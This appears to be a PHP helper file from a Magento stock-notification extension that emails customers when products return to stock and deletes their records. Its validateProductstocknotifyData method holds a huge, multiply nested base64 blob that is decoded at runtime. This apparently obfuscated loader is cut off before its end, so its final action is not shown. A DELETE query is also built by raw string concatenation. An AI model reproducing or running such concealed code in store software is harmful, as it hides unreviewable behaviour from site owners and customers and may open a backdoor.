<?php
namespace Emipro\Productstocknotification\Helper;
use Emipro\Flexishipping\includes\EmiproShippingHelper;

class Data extends \Magento\Framework\App\Helper\AbstractHelper {
    
    protected $_logger;
    
    protected $_stocknotify;

    protected $_scopeConfig;

    protected $_transportBuilder;

    protected $storeManager;

    protected $messageManager;

    protected $_response;
    
    protected $_resourceConfig;
    
    protected $_responseFactory;
    
    protected $_url;

    protected $_catalogproduct;

    protected $_resourceConnection;

    public function __construct(
        \Magento\Framework\Mail\Template\TransportBuilder $transportBuilder,
        \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
        \Emipro\Productstocknotification\Model\Stocknotification $stocknotify,
        \Magento\Store\Model\StoreManagerInterface $storeManager,
        \Magento\Framework\Message\ManagerInterface $messageManager,
        \Magento\Framework\App\ResponseInterface $response,
        \Magento\Framework\App\Config\Storage\WriterInterface $resourceConfig,
        \Magento\Framework\App\ResponseFactory $responseFactory,
        \Magento\Framework\UrlInterface $url,
        \Magento\Catalog\Model\Product $catalogproduct,
        \Magento\Framework\App\ResourceConnection $resourceConnection,
        \Psr\Log\LoggerInterface $logger
    ){
        $this->_transportBuilder = $transportBuilder;
        $this->_scopeConfig = $scopeConfig;
        $this->_stocknotify = $stocknotify;        
        $this->_storeManager = $storeManager;
        $this->messageManager = $messageManager;
        $this->_response = $response;
        $this->_resourceConfig = $resourceConfig;
        $this->_responseFactory = $responseFactory;
        $this->_url = $url;
        $this->_logger = $logger;
        $this->_catalogproduct = $catalogproduct;
        $this->_resourceConnection = $resourceConnection;
    }

    //use in product save after event 
    public function getProductId($id)
    {
        $emailTemplateVariables = $this->getTemplateVariables($id);

        $data = $this->_stocknotify->getCollection()->addFieldToFilter('product_id',$id)->getData();

        $stockId = [];
        foreach ($data as $key => $value) {
            $emailId = $value['email_id'];
            $this->getStockEmail($emailId,$emailTemplateVariables);
            $stockId[] = $value['id'];
        }

        if(!empty($stockId)){
            $this->getDeleteData($stockId);
        }
    }

    //admin product stock notification grid into send email and deleted record 
    public function getStockId($deleteids){
        $stockId = [];
        $data = $this->_stocknotify->getCollection()->addFieldToFilter('id',[$deleteids])->getData();
        foreach ($data as $key => $value) {
            if($value['email_id'] != null && $value['product_id'] != null)
            {
                $emailTemplateVariables = $this->getTemplateVariables($value['product_id']);
                $emailId = $value['email_id'];
                $this->getStockEmail($emailId,$emailTemplateVariables);
            }
            $stockId[] = $value['id'];
        }
        if(!empty($stockId)){
            $this->getDeleteData($stockId);
        }
        return;
    }

    public function getTemplateVariables($id){

        $product = $this->_catalogproduct->load($id);
        $emailTemplateVariables = [];
        $emailTemplateVariables['product_name'] = $product->getName();
        $emailTemplateVariables['product_url'] = $this->_storeManager->getStore()->getBaseUrl().'catalog/product/view/id/'.$id;
        $emailTemplateVariables['image_url'] = $this->getMediaBaseUrl() .'catalog/product'. $product->getImage();
        return $emailTemplateVariables;
    }

    public function getMediaBaseUrl() {
        /*$om = \Magento\Framework\App\ObjectManager::getInstance();

        $storeManager = $om->get('Magento\Store\Model\StoreManagerInterface');
*/
        $currentStore = $this->_storeManager->getStore();
        return $currentStore->getBaseUrl(\Magento\Framework\UrlInterface::URL_TYPE_MEDIA);
    }

    public function getDeleteData($stockId){
        /*$objectManager = \Magento\Framework\App\ObjectManager::getInstance();
        $resource = $objectManager->get('Magento\Framework\App\ResourceConnection');*/
        $connection = $this->_resourceConnection->getConnection();
        //get prefix table name
        $tableName = $this->_resourceConnection->getTableName('emipro_stock_notification');
        //Delete Data from table
        $stockId = implode(",", $stockId); 
        $sql = "Delete FROM " . $tableName." Where id IN(".$stockId.")";
        $connection->query($sql);
    }

    //sent email to customer
    public function getStockEmail($emailId,$emailTemplateVariables)
    {
        $sender_name = $this->_scopeConfig->getValue('trans_email/ident_general/name');
        $sender_email = $this->_scopeConfig->getValue('trans_email/ident_general/email');
        $sender = [
            'name' => $this->_scopeConfig->getValue('trans_email/ident_general/name'),
            'email' =>$this->_scopeConfig->getValue('trans_email/ident_general/email'),
            ];
        $templateId = $this->_scopeConfig->getValue('productstocknotify/stocknotify/stockemail', \Magento\Store\Model\ScopeInterface::SCOPE_STORE);
        $templateOptions = [
                    'area' => \Magento\Framework\App\Area::AREA_FRONTEND,
                    'store' => \Magento\Store\Model\Store::DEFAULT_STORE_ID,
                ];
        $transport = $this->_transportBuilder->setTemplateIdentifier($templateId)
            ->setTemplateOptions($templateOptions)
            ->setTemplateVars($emailTemplateVariables)
            ->setFrom($sender)
            ->addTo($emailId)
            ->setReplyTo($sender_email)
            ->getTransport();
            $transport->sendMessage();
    }

    public function validateProductstocknotifyData() 
    { 
        $tFmb=base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWmFSbUZJU2s5U2JUazFWVEkxVTFVeVNuTlRiV2hYVmtWS1RGcFhlSE5XTVhCRlVXMXNVMVl6YUV0V2JHTjNUbGRHUjFwRldrNVdlbFpvVlc1d1IxTkdiRFpUYTJSWVVteGFNRmxWWkRCVk1ERlhZVE53VjFZemFIWlpha0Y0VWpKT1IyRkZPVmhUUlVwMlZtMDFkMk13TVZkalNFNVhZa1UxYjFWcVJrdFRWbFp6VmxSR1UxSXdXbGRWYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmtSazVPVm0xME0xWXlkRmRoTVZsNVZXeG9WVmRIZUhCVk1GcDNZMFpzV0dORlRtcFNiRXBaV2xWV1QySkdXWGRpUkZaWFZqTkNTRll5YzNkbFJrNXhWMjFHVTFZd01IaFhWbU40VW0xV1ZrNVdiRmhpV0ZKVVZGYzFiMDFHWkZkWGJYUlZUV3RhU1ZaWGRHOWhWazVIWTBoQ1dsWnNXbmxVVkVaUFZteFNWVlZ0ZEdsU2JrSmhWbXRqZUU1R1RuTlRXR3hzVWtWYVZWWnNaRzlWUm14eFUydHdiR0pGV2xsWGExcFBWMFpKZVZwRVRsZE5ibWh4VkZaa1YyUkdTbk5oUmtKWVVteHdURlpYZUZOV01rbDRZa2hPWVZKc2NHaFVWV2hUVTBaYWRFNVlaRnBXYkd3MFZXMHdNVmRIU2xWUlZFWmhWbXhhZWxWdE1WZFRWa1p6WTBVMWFWSnRPVFJXTVdoM1V6RmFjMkl6YkZOWFIzaFlXVmQ0WVZSV1dsbGpSazVwWWtaV05GbFZXa3RaVlRGeVkwWndWMkpVVmpOWlZFWkdaREZPY1ZkdFJsTldNVXBKVjJ4YWExVXhTa2RTYmtaVllsZG9XVlZ0ZEhkTmJGVjRWbXhPVkdKSE9UUlpNRnB2VjJzd2VGZHJkRlpoTVZvelZXeGFkMUl5UmtaUFZUVlRUVWQzTVZaR1dtOVpWMFp6Vkd0a1ZHSnRVbUZaVjNSeVpERndSMVpzVGxaaVZXdzFWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeGFhV0Y2Vm5aV2JYQkNUVmROZUdKSVVrOVdWR3h3VlcweGEwNVdWblJPVlRsb1VteHNNMVl5Y0dGV2JFcHlUbFY0WVZKRmNGQmFSVlUxVjBkU1NHUkdaRTVTUmtsNlZqRm9kMVF4VlhsVmJrNW9UVEo0Y2xVd1dtRmpSbEpWVW10MGEwMVhVakJVYkdoTFlVWmFWV0Y2UmxaV2JXaG9Wa1pWZUZack5WbFViR2hYVWxSV1ZWZFVRbXRUYlZaV1RsVm9ZVkpzU2xoVVZsWmhaRlprV0dORmRGaGlSemsxVlRKMGIyRldTWHBSYldoWFltNUNXRlJ0ZUd0ak1WSnlWRzFzVjAxR2NGcFdiVEF4VkRGc1YxSllaRlJpYlZKaFdXeGtORkpHY0ZoTlZtUllWbXhLZUZWWE1VZFdNbFp5VTFob1dHSkdXbkZhVldST1pERldjMU50YkU1aVZrcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJSTVZKV1ZtcENWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEhVa2hpUms1T1ltMW9ORlpxU2pSaGF6RllWbTVPYWxKdFVsRldNRlozWVVaWmQxcEljRTlXYXpWNVdWVmFUMkZWTVhKWGJIQlhVbTFvVkZaV1pFdFNWMHBGVjJ4b1YxSlhjM2hYYTFKSFpERmFjMVZ1VmxoaVYzaHdWbTAxUTAweFdYbE9XRXByVFVoT05GbHFUbk5XTWtaeVUyeG9XbUpHV21oYVYzaDNVakZ3UjFkdGJFNVNhM0JVVjFkd1MyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVaRmhpUjJoNlZsUktUbVZXU25OaFJsWnBWMGRvZDFkWE1YcE5WMDE0V2tWV1ZHRXlVbkZVVjNSaFYxWldkRTVZWkdsV2JGa3lXV3RvZDFkc1duUlZiRUphWVRKU1RGcEZXbE5rUjFaR1RWVTFhV0pYWjNwV2FrWlRVekZaZVZWc1pHaE5NbmhZVm1wS05GUnNWbGRWYTA1VlVtczFWMVpIZEV0WlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndSMkl4U25KTlZtaG9VakJhVDFsclduWmxSbVJ5Vm0xd1QxWnRkRFJXYkdoM1ZtMUtjMk5JUmxwaVJuQm9XVmQ0WVZJeGJEWldiV2hPVjBWS1dsZHNWbXRVTVZweVRWaEtUMVpGY0dGVVZXUlRWMFpWZVUxVmRHdFdiRm93V2xWa2QyRldXblZSYmxwWFRWWktURlp0Y3pGamF6bFpWR3hXYUUxVmNGZFdSbHBYVXpGSmVGcEZWbE5oZW14WVZtMTRSMDVHVlhsa1IwWlZVbXh3U2xaSGN6VlZhekYwVkdwT1ZtVnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuUlNXR3hVWWtkb1ZGbHNVbGRoUmxwelYydDBUbUpIZUhwWGExWnJZV3hKZDJOSWFGVldWMUp5VlhwR1QxSXhUblZYYkhCWFlsZG9VRmRyVm1GUk1rMTNUMVpzYWxJelVsUmFWekV6VFZaWmVXVkdXbXhTTUZwSlZUSTFVMVV5U2xWV2JXaFhUVVphZWxSVldsZFRSVEZZWkVkc1UwMVZjRWxXYTJSM1VUSkdWazFJWkdwVFJUVlZWRlZWTVdWV2NFWlhhMDVyVW01Q1NWcFZaREJWTVZwWlVXNWFXRmRJUWt4V2FrWmhaRVpTZFZWdGRFNWhiWGhoVmxkNFUxSXlTWGhhU0VaVVlrZFNjbFpxUmt0VFZsRjRXa1U1VmsxcmNIbFpNR00xVjIxS1NGVnNhRlZXUlhCTFdsZDRUMlJXVG5OaVJrNXBVbTA0ZUZZeFpEQldNazE1Vld4b1ZtRXlhRmhaYlRFMFlVWnNjMVp0Um1wV2JWSjZWbGMxWVZReVNrZGpSbWhXVFc1T05GWXhWWGhXTVU1MFVteGtWMVpzY0ZsV01qRTBWMjFSZUZkdVNsVmhNMmhZVlRCVk1WVkdWbFZUYms1U1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQWTJ4d1IxUnRhRk5OUkVVeFYxWldhMk15UmxaTldFcFlZV3hhV1ZsVVJuZFhSbkJYV2tWMFUxSnJXbFpaYTFaM1ZXc3hWbUpFVGxoV2JGcHlXWHBLVjJOdFZrZFdhemxYVFZoQ2VWWnFRbGRrTWxaelZXdGtWbFpGV25CWmEyaERWMnhhV0dWSFJtaGlWWEJhVjJ0b1lWWkhSbkpqUldoYVZrVndURll3WkV0VFZscHlUVlUxYUUxWVFqVldNV1EwWVRKTmVWVnNXbXROTW5oWFdXeGtiMk5XVWxoTlZ6bHFVbTE0ZUZVeWRHdGlSbHAxVVd0V1dGWkZOVVJXVldSVFRteEdjbVZHVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbmROTVZsNVRWaE9hVTFyY0VsVk1uaHpWVzFHY2xOdVRsZFdSWEJ5V1RKNGMyTnNjRWxVYldocFUwVktXbFpIZUc5a01XeFhWMjVHYVZOSGVGbFphMlJ2WlZacmQxWnFRbGRTYTFwNFYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWYVZsVlhkRFJXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVbXR3YTAxWGVGZFhhMmhQWWtkRmVtRkdXbFZpUjJoVVYxWmFhMUpyTlZWWGJHaFhZbFpLZVZkWGRHRlZNV1JIVTI1V1YySklRbGhVVjNoTFpXeGtWVk51U210TlNFNDBXV3RhYjFadFNsbFZiRkpYVFVaYU0xUnNXbk5qVmxKeVkwZHNUbFl5VVRCV1JFSnFUbFpPZEZOcldsUmlia0paV1d0a1UxTkdjRmhsU0dSWFVtdGFNRnBWWkhOaFYwcEdZMGh3V0ZaRmNIcFZWRXBPWlZaS2MyRkdWbWxYUjJoM1YxY3hlazFYVFhoVWJGcGhVa1ZLY0ZWcVJtRldWbEp5V2toT1ZWSnNWalZaTTNCUFZURktjbGRxU2xoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFY1V1ZWYVQyRlZNWEpYYkhCWFVtMW9WRlpXWkV0U1YwcEZWbXhvYVZJeWFGRlhhMUpMVTIxV1ZrNVdiR3BTTUZwWVZtMDFRMlJzV1hoVmF6bFdUV3hLTUZaSE5WZGhSVEI0VTJ4S1dtSkdWWGhVYkZwcll6RndSbHBGTlZOaWEwcFdWakp3VDFFeFVsZFhhMVpYWVd4d1dWbHJaRzlXUmxwVlVtNWtXRkpzV2pGVlZ6RjNZVlphYzJOSWFGaGhNVnBRV1cweFJtVkhUa1poUms1cFltdEtkbFpYY0VOa01ERnpXa1prYUZKWVVtOVVWbHAzVjJ4VmVVNVZPVlZTYkZreVZWWm9TMWR0Vm5KalJtaGhVbXh3TTFWcVJrOWtSMVpJWTBVMVRsSlhPVFZXTVdOM1RWWlJlVk5yV210U1ZrcHZXbGN4VTFKc1dsZFplbFpwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVqQmFWRlJYTlc5bGJGWTJVV3M1YW1GNlVqTldWM2hMWVZVeGRGVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1ZGWkdXbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWc1drWlRhekZXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVekpSZUZwSVVtbFNlbFp2VldwQk1WTnNWWGxOVkZKYVZsUkdWbGxyVWtOWFJscDBZVVpTV2xaNlJraFZhMXAyWlZVMVZrMVhlR2hOVmxZMFZtdGFhMk5yTVVoV2ExcFBWMFZhYUZSVVJtRlViSEJYV2tVNWJHSkZOVmRXUjNoUFlURktkR1ZHYkZoaE1sRXdWbFJHUzA1dFNrVlJiR2hYWWxaS05sZHJXbGROUmxwSFVteG9UbFpZVW05V2JGWmhaR3hrVlZGdE9WUk5hM0JJV1dwT2IxVkdaRWRUYlVaWFRVWndURmt4V25OV2JGSjBUbGRzYUUweVkzbFdWM2h2WXpGUmVWWnNWbFpoYXpWV1ZXcE9RMUV4Y0VkV1dHaFhVbFJzU1ZSc1ZYaFZhekZHVjI1c1dGWXphSEpWYWtwTFl6Sk9SMWRzV21saVNFSjNWbTF3UTFsWFVYaGlTRkpwVTBWd2FGUlZhRU5rTVZsNFdrZDBWR0pIVWtkVk1uQlhWMGRLU0ZWdVNsaGlWRVpNVmpCYVMyTldSbk5qUlRWcFZqRkplVlpVU1RGamF6VllWRmhzVkZkSGVGWlpiR1J2WTBaV2NWTnRPVTVpUjNjeVZrZDRTMkV5UlhwUlZFWmhVa1Z3Y2xWNlJrdE9iRXAwVDFab2FHRXpRbGxXVjNoclUyMVdWazFXYUdoU01taFlXbGQ0UzAweFZqWlNhMXByVFZVeE0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xSck9VNVNhM0JVVjFkd1MyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJtTkVUbGROYWtaNldXcEtWMlJHVm5KaVJsSnBZWHBXYjFadE5YZFZNbEp6Vkc1S1lWSkdTbkZWYlRFd1RsWmFkRTVXWkdoaGVrWjZWakl3ZUZkc1drWmpSbWhWWWtaWmQxWnNWWGhTVjBwR1QxWk9VMVpXYjNwV1YzUmhVakpTYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURklaVVZXVmxZelFuSlZiRnBYVjBVNVdFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZUZaTlJscE1Xa1JHYTJNeGNFWlBWMnhUVFVSUmVGWldXbE5qTVU1elZHdGFWR0pVYkdGVVYzQlhWVVpzY2xkdE5XeGlSbkF4V1d0a2MxVnJNWFJWYm14WVZqTm9jbFZxU2t0ak1rNUhWMnhhYVdKSVFuZFdiWEJEV1ZkUmVHSklVbWxUUlhCUVZGVmtORkpXVmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBXVm1wT1ZtVnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzaFBZVVV4Y21KRVZsVldiVkoyV1ZWYVlVNXNWblJPVmxwVFlYcFdSVmRVUW10VWJWWnpWVzVTYkZJelVsTlVWekZUWlZaa1ZWRnRkR3BOYTNCSVdWUk9jMVl5U25WUmJHeGhWbTFTVkZwSGVITmpWbEp5VDFVMVUxWjZhekJXUmxadlVURk9jMU5yVm1oU2VsWlZXVlJLYjFKR2EzZFhibVJZVW14S01GcFZaSGRVYkdSR1RsUkdXRlpzV25GVWJHUlhaRVpXY2xWdFJsTk5WWEJNVmxkMGFrNVhTbk5VYmtwb1VsVTFjVlZ0TlVOWFZscElUVlJTYUdGNlJscFdSelZEVjJzeFNGVnJhRlZXVjFKSVZXdGFUMlJHVm5OUmJYUnNZVEJ3VGxaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsVXllRXBsVjFaSlZXeFNWMVpVVmpKWGExSkxWREpTUjFkdVVrOVdiWGhQV1ZkMFlXUnNaSEpXYlhSVlRXdHNNMXBGVmxOWGF6QjRZMFV4Vm1FeFNucFdWM2hYVW14d1IxUnRkR2xXV0VKYVZsY3dNVkV5UmxoU2JrWlhZbGQ0V1ZadGMzaE9SbEowWXpOb1UxSlVSa1pXYlhoelZqSktjMU51V2xkU1ZuQjJXa2N4VW1ReVZrZFdiV3hUVFVSV1QxWnRNWGRTYXpCNFZXeGtWV0ZyTlU5WldIQkRUbXhTVjFwRk9WVldNSEJLVmxjd05WWldTblJoUkU1WVZrVkpNRmw2UVhoV1ZuQkdUbGRvV0ZJd05ERldNakUwVkRKT2RGSllaR3ROTW5odlZGZHdWMVJzVmxWUmEyUnFZa2RTZVZkWWNGZGhNVXAwWlVac1dtRXlhRmhXUmxwR1pERktkVk5zY0U1aGExcFpWMWN3ZUZRd05WaFNXSEJTWVROQ1ZWVXdWVEZWUmxaVlUyNU9VbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VVRGa2NWRnVUbE5TYkZvd1drVmtjMVJ0Um5KWGJscFlWbXh3Y1ZSV1dsSmxSMDVIWWtad2JHSllhRTFXVkVKWFpESk5lRnBJUmxWaGVteGhXVlJKTlU1V1dsaE9WMFpvVm14c00xWXlOV3RYYlVwWVpVaEtXR0V4VlRGVVZFRjRVbTFTUm1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZjRlZXVjFKeVYxWmFXbVZ0UmtWWGJHaHBVbFJXUlZaSGNFTlZNVlowVTFoc1lWSllRbE5VVlZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlhM0JaV1ZSS1RrMVdjRVpYYms1WVVqQndTbFp0ZUZkaFZscHpZa1JhVjFaV2NIWlZWRXBIVTBaU2RWWnNWbWxYUjJoaFZrWlNSMWxWTlZkaVNFcFZZbFJXYjFSWGRIZFhWbFowVFVSR1dsWnNjRmhWTW5CTFYyMUtTRlZyYUZwTlIxSk1XVEJrVW1WV2NFZFhiRTVYVFcxb1ZGWnFRbE5TTVZsNFZsaG9WbUV5VWxGV2JHUTBWbXhTVjFaVVJsZGlSVEUwVmxjMWQxWlhSWGRPV0dSV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNUVVJzVjFaWGVFdGhWVEYwVld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFUyczVWRlpyTlRCYVZXUkhWR3hhU0dRelpGZE5WbkIyVmxSS1IyUkdTbkpWYlVaT1lsaG9UMVpHV2xOVk1sSnpWbXRXVTJFd2NGRlZiVFZEVTFaUmVHRkdUbGhpUm13MVdsVlNSMVpzU1hwYU0yUmFWbFpaTUZZeFpFcGxiSEJHVFZaa1UwMHlhSGxXYlRWM1V6RktkRlZyYUZkaWExcFRWakJhUzFWV1duUk9WM1JPVW0xU1NGbFZhSGRpUmtwWllVVmFWMDFYYUROWmJGcFdaVmRTUlZOc2NGZGhlbFpNVjFod1EyTXhTa2RXYmxKclVqSjRUMWxYZEdGa2JHUlhWMjF3VGxac1JqUlpNRnB6VjJzd2QwNVZkRlpXUlZwTVZGUkdhMVl5UmtkVWJVWnBVak5vWVZaVVNURmpNV1J6V2tWb2ExTkhVbFpVVkVwUFRURldObEZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmlSVFZ2VkZkMGMwNVdVbGRhUnpsb1VteHZNbFpXVWxkV1IwVjVZVVZTV2xaWFVsUlZha0UxVjBkR1NHTkhiR2hOTUVveVZqSjRZVmxYVm5SVGJrNXFVbGRvVVZZd1drdFpWbHB4VTJwU1RsWnJOWGhWYkdoclZEQXhSMU5zVGxwaGEwVjRWV3RrUjFac1NuUk9WbEpYVmxSV1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWHBWYldoV1ltNUNlbFJWV210V01YQkpWRzEwVjJFeFdURlhWbFpyWWpKR2RGSnVTbGRXUmxwaFdsZHpNVmRHYkZkYVJUVnNZa1phTVZsclZqUlZhekZXWTBoc1dGWXpRa3RhVldSSFUwWktjMkZGT1ZSU1ZGWlBWbTEwVm1WSFZuTlZiR1JWWW10d1VGUlZXa3RWTVd4eFUyMTBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYWxKWGFGZFpiWGgzWTBaYWNWRnRSbXROVjNnd1drVlZOV0ZWTVZobFJuQldUVmRvZWxaV1dtdFNhelZKWVVab1YyVnNXbEZXUmxaclZESk9SMkl6Ykd0U01GcFVXbGN4TTJReFdYaFhiWFJxVFd4S1YxcFZWbE5VYkU1SVpVVTFWbUV4V2xoYVJFWlNaV3hyZWxwR1VrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZsUktSbVZXVGxsaVJUVlhUVzFvZGxadE5YZFdNVXBYWWtaYVlWSlhVbk5XYkZKR1RXeFNWMkZJWkdoTlZtd3pXVEJTWVZsV1NsaGhSWFJhWVd0S00xVXdXbGRrVm1SMFlrWmtUbEp1UVhwV01XTjRZekF3ZVZWcldrNVdiRXB5VkZSS2IxUldXbkpoUlRsVlRWVldOVmxyVmt0WlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmxWbGw1WlVjNWFVMUVSa2haTUZwdlZERmtTVkZ0T1ZkaWJrSjZWRlphVjFaV1RuUlBWMmhUVFVSV05GWlhlRk5qTWtaeVRVaG9XR0pyU21GYVYzTXhWa1p3VjFacVFsTlNiRm93V2xWa05GWkdTbkpqU0hCWVZucEJlRlpFU2s5VFJrNVpZa1U1VkZKVVZsQldWbEpQWVRBMVIxUllhRlppYmtKV1dWUkJNV1F4VmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuUlNXR2hxVW0xNGIxVnJWa3RoUmxwMVkwWmtUMkpIZUZoWFdIQlhZVEZhY2xacVZscFdWMUoyV1ZjeFIyTnRSalpXYkhCc1lYcFdXVmRXV210VWJWWnpWbTVXYVZKWWFGTlVWbFozWld4a2MxWnRPVlpOYTNCSlZUSTFWMVpYU25KVGJrSlZWak5DVkZwWGVGTldNVkp4VkcxNFUxZEdTbGRYV0hCQ1RWWktTRkpzV2xOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5NVXB2Vm1wQ2EySnRVWGhhU0U1YVpXdGFjMWxzVm1GWFZsRjRZVVprVm1GNlJqQlpWV00xVjJzeGRWRnJPVlZOVjFKUFdsZDRZV1JIU2toalJUVk9WbGM0ZUZaWWNFTlVNVlY1VTJ0b1YyRXllRmRaYkdodlkwWnNkR042Um10TlYzaDRWVEZTUTJGck1VVlNibVJoVWtVMWRsWkZXbUZUVmxKeVQxWktUbUpWTkhwV1dIQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2MxUnRhR2xXVm5CS1YydFdWMVl5UmxaTldFWlRZbFJzWVZadE1VNWtNWEJXVjJ0T1dGWnNTbmhWYlhoM1lWZEdObFZxVGxoV1JYQjZXVzB4Um1WV1RuSmhSMnhUVFRCS2IxWnROWGRXTURWeldraE9XRlpHV25GWmEyaERWMnhzVlZSck9WVmlSbkJIVm0wMWQxWldXbkpPV0d4VllXdEtWRlpYTVVwbFZuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZKVVd0c1YxSjZRVEZaVlZWNFVqRk9jVk5zY0dsU01VcEpWMVJDYTFNeVRsZFViRlpwVWpOQ1QxUldXbmRrTVdSWlkwVTVWazFzV2xkYVJWWlRWbTFLY2s1WE9WZGhhMFY0V1hwR2MyUkZOVlpQVjJ4VFlsZFJNVmRyVm10T1IwcEhWbGh3WVZKR1NsWlpiR1F6Wld4d1ZsWnFRbGRXTURFelZHeFdVMkZHV2xaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSRUpZWVhwR01GbFZhSE5XYlVWNVZGUkdZVkpXY0hwV01HUkxVMVphY2s1WGVHaGhNV3Q1VmpKMFlXRXhUWGxXYmxKV1lUSjRWVlp1Y0hOVVJsWnhWRzA1YTAxWFVsWlZNbmhyWVRGWmQwMVVWbGRpVkVab1dWVlZlR014WkZWU2JGWlRWbXR3U0ZaSGVGZE9Sa3BYVTJ4c1VtSkZTbkphVjNSTFZGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWWFGUmlhMXBoVm14a1VtUXhWblJOVm1SVVZteGFNRnBWWkhOaFYwcEdZMFJPV0ZZelFrdFVWV1JYVWpGR2MySkdWbWhoTVhCb1YxY3hlazFIVVhoaE0yeHBVbnBXYjFSWGRIZFRWbXh5V2toa1dsWnNiekpXYlhCaFYwZEtSMkY2UmxwTmJtZ3pWakZrUm1Wc1VuSk9WMmhwVW14dk1sWnJXbUZVTWs1eVRraGtWbUpGY0hCVVZ6RlRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWkRGT1IxVnVVbEJXTW1oUFZXMTRjbVF4WkhKV2JYUlhUV3hLV1ZaWGRHOWhWazVIWTBoQ1dsWXpVbmxVYkZwelRteFNjMXBIYUZkTlJFVXlWbXhqTVdNeFVrZFNXR2hVWW01Q1lWWnRNVk5WUm14eVdrVjBhMVpzU2pCYVZWcHpWRzFLYzFOdWNGaGlSbkJRV